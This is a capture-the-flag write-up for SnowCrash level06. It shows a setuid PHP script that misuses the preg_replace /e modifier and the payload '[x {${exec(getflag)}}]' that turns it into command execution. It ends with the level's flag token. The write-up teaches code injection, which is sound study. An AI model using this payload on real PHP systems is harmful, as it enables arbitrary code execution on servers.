# Okay lets see what we have by doing a ls -la

level06@SnowCrash:~$ ls -la
total 24
dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout
-r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc
-r-x------  1 level06 level06  675 Apr  3  2012 .profile
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php

# We can see that we have have been given a excutable and a php file.

# We will cat the php file and see what is in it

level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>

# Lets see what happens when running the file

level06@SnowCrash:~$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4

# We can see that it wants a file name and this will be our way in.
# 	You can see that they use the /e regex modifier that eval any paramaters given, so easily exploitable, 
# 	we just have to meet the needs to the $2 replacement
#	Inject the following `(\[x (.*)\])`

# The first capture group is `(\[x (.*)\]` so `[x whateverText]` will match.
#	The second capture group is (.*) and this is given to the y function

# Using the information form the link about how to exploit this we shall do so with below code
[x {${exec(getflag)}}]
# "This gives the attacker the ability to execute arbitrary PHP code and as such gives them nearly complete access to your server."
#	Using this `{${exec(...)}}` will execute any given command as the shell own by the user who own the script here 
#		(Which is level06 has the correct user rights to run getflag command)

echo '[x {${exec(getflag)}}]' > /tmp/Gabe; ./level06 /tmp/Gabe

# Using php own weakness in the use of this the error message will contain your flag 

level06@SnowCrash:~$ echo '[x {${exec(getflag)}}]' > /tmp/Gabe; ./level06 /tmp/Gabe
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1

# What we learnt
#	We used a code injection attack.

Resources
http://php.net/manual/en/reference.pcre.pattern.modifiers.php
https://stackoverflow.com/questions/16986331/can-someone-explain-the-e-regex-modifier
http://www.madirish.net/402
https://www.usna.edu/Users/cs/aviv/classes/ic221/s16/lec/24/lec.html
http://php.net/manual/en/function.exec.php
https://stackoverflow.com/questions/3115559/exploitable-php-functions